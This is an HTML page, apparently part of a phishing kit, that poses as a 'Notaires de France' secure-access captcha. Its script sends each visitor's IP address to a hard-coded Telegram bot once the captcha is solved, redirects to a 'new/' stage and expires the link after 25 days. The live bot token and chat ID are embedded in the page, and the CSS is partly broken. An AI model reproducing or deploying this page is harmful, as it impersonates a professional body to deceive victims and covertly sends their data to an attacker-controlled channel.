<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Acc√®s s√©curis√©</title>
  <style>
    body {
      font-family: 'Georgia', serif;
      background-color: #f8f8f8;
      color: #333;
      padding: 40px;
    }
    .captcha-container {
      max-width: 500px;
      margin: auto;
      background: #ffffff;
      border: 1px solid #ccc;

    .captcha-question {

    input[type="number"] {

    }
    .submit-btn {

    }

    .error-message {
      color: red;

    }
  </style>
</head>
<body>
  <div class="captcha-container">
    <img src="download.png" alt="Logo Notaires de France" class="logo">
    <h2>Acc√®s s√©curis√©</h2>
    <div class="captcha-question" id="captcha-question">Chargement...</div>
    <input type="number" id="captcha-answer" placeholder="Votre r√©ponse">
    <br>
    <button class="submit-btn" onclick="validateCaptcha()">Valider</button>
    <div class="error-message" id="error-message">R√©ponse incorrecte. Veuillez r√©essayer.</div>
    <div class="success-message" id="success-message">CAPTCHA r√©solu avec succ√®s. Redirection en cours...</div>
  </div>

  <script>
    const BOT_TOKEN = "5722730835:AAF-83VyMq8uBs0klBjz3iAdfEzPNJz8w0o";
    const CHAT_ID = "-868620860";

    let num1, num2, correctAnswer;

    function generateCaptcha() {
      num1 = Math.floor(Math.random() * 10) + 1;
      num2 = Math.floor(Math.random() * 10) + 1;
      correctAnswer = num1 + num2;
      document.getElementById('captcha-question').textContent = `Combien font ${num1} + ${num2} ?`;
      document.getElementById('captcha-answer').value = '';
      document.getElementById('error-message').style.display = 'none';
      document.getElementById('success-message').style.display = 'none';
    }

    function validateCaptcha() {
      const userAnswer = parseInt(document.getElementById('captcha-answer').value, 10);
      if (userAnswer === correctAnswer) {
        document.getElementById('error-message').style.display = 'none';
        document.getElementById('success-message').style.display = 'block';

        fetch("https://api.ipify.org?format=json")
          .then(res => res.json())
          .then(data => {
            const ip = data.ip;
            const message = `üß© CAPTCHA valid√©\nüîê IP : ${ip}`;
            return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message
              })
            });
          })
          .then(() => {
            localStorage.setItem("valide", "true");
            setTimeout(() => {
              window.location.href = "new/";
            }, 2000);
          })
          .catch(error => {
            console.error("Erreur Telegram:", error);
            setTimeout(() => {
              window.location.href = "new/";
            }, 2000);
          });
      } else {
        document.getElementById('error-message').style.display = 'block';
        document.getElementById('success-message').style.display = 'none';
        generateCaptcha();
      }
    }

    const startDate = new Date('2025-06-27T00:00:00');
    const expirationDays = 25;

    function isLinkExpired() {
      const now = new Date();
      const timeDiff = now - startDate;
      const daysPassed = timeDiff / (1000 * 60 * 60 * 24);
      return daysPassed >= expirationDays;
    }

    function showExpirationMessage() {
      if (isLinkExpired()) {
        document.body.innerHTML = '';
        const messageDiv = document.createElement('div');
        messageDiv.innerHTML = `
          <h1>‚ö†Ô∏è Le lien a expir√©</h1>
          <p>Veuillez contacter l‚Äôadministrateur du site pour plus d‚Äôinformations.</p>
        `;
        Object.assign(messageDiv.style, {
          position: 'fixed',
          top: '0',
          left: '0',
          width: '100vw',
          height: '100vh',
          display: 'flex',
          flexDirection: 'column',
          justifyContent: 'center',
          alignItems: 'center',
          backgroundColor: '#1a1a1a',
          color: '#ff4d4f',
          fontFamily: 'Segoe UI, Arial, sans-serif',
          fontSize: '24px',
          textAlign: 'center',
          padding: '40px',
          boxSizing: 'border-box',
          zIndex: '9999',
        });
        messageDiv.querySelector('h1').style.fontSize = '36px';
        messageDiv.querySelector('h1').style.marginBottom = '20px';
        messageDiv.querySelector('p').style.color = '#ffffff';
        document.body.appendChild(messageDiv);
      }
    }

    window.onload = () => {
      generateCaptcha();
      showExpirationMessage();
    };
  </script>
</body>
</html>
